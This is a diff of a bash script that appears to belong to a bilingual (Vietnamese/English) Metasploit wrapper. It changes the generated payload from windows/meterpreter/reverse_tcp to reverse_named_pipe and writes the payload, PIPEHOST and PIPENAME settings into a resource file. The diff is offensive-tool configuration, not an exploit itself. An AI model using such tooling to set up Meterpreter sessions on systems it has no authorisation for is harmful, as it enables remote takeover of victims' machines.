@@ -1,24 +1,24 @@
 function defaul_payload_options {
-	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
-	lport="4444"
+	pipehost=""
+	pipename="msf-pipe"
 	exitfunc="process"
 }
 function payload_compare {
-lhost_lenght=`echo "$lhost" | awk '{print length}'`
-echo $lhost_lenght
-	if  [ "$lhost_lenght" -le 18 ]; then
+pipehost_lenght=`echo "$pipehost" | awk '{print length}'`
+echo $pipehost_lenght
+	if  [ "$pipehost_lenght" -le 18 ]; then
 		payload1
 	else
 		payload2
 	fi
 }
 function set_payload {
-		if [[ "$new_processing_variables" = "lhost" ]] || [[ "$new_processing_variables" = "LHOST" ]] || [[ "$new_processing_variables" = "Lhost" ]]; then
-			unset lhost
-			lhost="$module_set"
-		elif [[ "$new_processing_variables" = "lport" ]] || [[ "$new_processing_variables" = "LPORT" ]] || [[ "$new_processing_variables" = "Lport" ]]; then
-			unset lport
-			lport="$module_set"
+		if [[ "$new_processing_variables" = "pipehost" ]] || [[ "$new_processing_variables" = "PIPEHOST" ]] || [[ "$new_processing_variables" = "Pipehost" ]]; then
+			unset pipehost
+			pipehost="$module_set"
+		elif [[ "$new_processing_variables" = "pipename" ]] || [[ "$new_processing_variables" = "PIPENAME" ]] || [[ "$new_processing_variables" = "Pipename" ]]; then
+			unset pipename
+			pipename="$module_set"
 		elif [[ "$new_processing_variables" = "exitfunc" ]] || [[ "$new_processing_variables" = "EXITFUNC" ]] || [[ "$new_processing_variables" = "Exitfunc" ]]; then
 			if [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]]; then
 				unset exitfunc
@@ -50,23 +50,23 @@ myvar=""
 		none=" "
 		myvar=""
 	}
-lhost=`echo $lhost`
-lhost_lenght=`echo $lhost | awk '{print length}'`
-	integer=`expr 18 - $lhost_lenght`			
+pipehost=`echo $pipehost`
+pipehost_lenght=`echo $pipehost | awk '{print length}'`
+	integer=`expr 18 - $pipehost_lenght`			
 	for (( i = 0 ; i < $integer; i++ )) do
 		myvar=$myvar$none
 	done
-	lhost=$lhost$myvar
+	pipehost=$pipehost$myvar
 unset_value
-lport=`echo $lport`
-lport_lenght=`echo $lport | awk '{print length}'`
+pipename=`echo $pipename`
+pipename_lenght=`echo $pipename | awk '{print length}'`
 	none=" "
 	myvar=""
-	integer=`expr 18 - $lport_lenght`			
+	integer=`expr 18 - $pipename_lenght`			
 	for (( i = 0 ; i < $integer; i++ )) do
 	myvar=$myvar$none
 	done
-	lport=$lport$myvar
+	pipename=$pipename$myvar
 unset_value
 exitfunc=`echo $exitfunc`
 exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
@@ -88,23 +88,23 @@ myvar=""
 		none=" "
 		myvar=""
 	}
-lhost=`echo $lhost`
-lhost_lenght=`echo $lhost | awk '{print length}'`
-	integer=`expr 27 - $lhost_lenght`			
+pipehost=`echo $pipehost`
+pipehost_lenght=`echo $pipehost | awk '{print length}'`
+	integer=`expr 27 - $pipehost_lenght`			
 	for (( i = 0 ; i < $integer; i++ )) do
 		myvar=$myvar$none
 	done
-	lhost=$lhost$myvar
+	pipehost=$pipehost$myvar
 unset_value
-lport=`echo $lport`
-lport_lenght=`echo $lport | awk '{print length}'`
+pipename=`echo $pipename`
+pipename_lenght=`echo $pipename | awk '{print length}'`
 	none=" "
 	myvar=""
-	integer=`expr 27 - $lport_lenght`			
+	integer=`expr 27 - $pipename_lenght`			
 	for (( i = 0 ; i < $integer; i++ )) do
 	myvar=$myvar$none
 	done
-	lport=$lport$myvar
+	pipename=$pipename$myvar
 unset_value
 exitfunc=`echo $exitfunc`
 exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
@@ -121,26 +121,26 @@ if [ "$language" = "VN" ]; then
 yes="     Có   "
 no="     Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_named_pipe):
 
    Tên            Thiết lập hiện tại    Yêu cầu   Miêu tả
    ----           ----------------      --------  -----------
    EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
-   LHOST          $lhost$yes    Địa chỉ lắng nghe.
-   LPORT          $lport$yes    Cổng lắng nghe.
+   PIPEHOST       $pipehost$yes    Máy chủ PIPE để kết nối với.
+   PIPENAME       $pipename$yes    Tên của PIPE để lắng nghe.
 
 !
 elif [ "$language" = "EN" ]; then
 yes="     yes"
 no="     no "
 cat << !
-Payload options (windows/meterpreter/reverse_tcp):
+Payload options (windows/meterpreter/reverse_named_pipe):
 
    Name           Current Setting       Required  Description
    ----           ---------------       --------  -----------
    EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
-   LHOST          $lhost$yes      The listen address.
-   LPORT          $lport$yes      The listen port.
+   PIPEHOST       $pipehost$yes      Host of the pipe to connect to.
+   PIPENAME       $pipename$yes      Name of the pipe to listen on.
 
 !
 fi
@@ -150,26 +150,26 @@ if [ "$language" = "VN" ]; then
 yes="   Có  "
 no="   Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_named_pipe):
 
    Tên            Thiết lập hiện tại	       Yêu cầu    Miêu tả
    ----      	  ---------------  	       --------  -----------
    EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
-   LHOST          $lhost$yes     Địa chỉ lắng nghe.
-   LPORT          $lport$yes     Cổng lắng nghe.
+   PIPEHOST       $pipehost$yes     Máy chủ PIPE để kết nối với.
+   PIPENAME       $pipename$yes     Tên của PIPE để lắng nghe.
 
 !
 elif [ "$language" = "EN" ]; then
 yes="   yes"
 no="   no "
 cat << !
-Payload options (windows/meterpreter/reverse_tcp):
+Payload options (windows/meterpreter/reverse_named_pipe):
 
    Name           Current Setting  	       Required  Description
    ----           ---------------  	       --------  -----------
    EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
-   LHOST          $lhost$yes      The listen address.
-   LPORT          $lport$yes      The listen port.
+   PIPEHOST       $pipehost$yes      Host of the pipe to connect to.
+   PIPENAME       $pipename$yes      Name of the pipe to listen on.
 
 !
 fi
@@ -179,9 +179,9 @@ payload_path_present=`pwd`
 payload_path_rc_file="$payload_path_present/Config"
 rc_file="$payload_path_rc_file/file.rc"
 config_file="$payload_path_present/Config/config"
-	echo "set payload windows/meterpreter/reverse_tcp" >> $rc_file
+	echo "set payload windows/meterpreter/reverse_named_pipe" >> $rc_file
 	echo "set EXITFUNC $exitfunc" >> $rc_file
-	paylo="windows/meterpreter/reverse_tcp"
-	lhost=$lhost
-	lport=$lport
+	echo "set PIPEHOST $pipehost" >> $rc_file
+	echo "set PIPENAME $pipename" >> $rc_file
+	paylo="windows/meterpreter/reverse_named_pipe"
 }
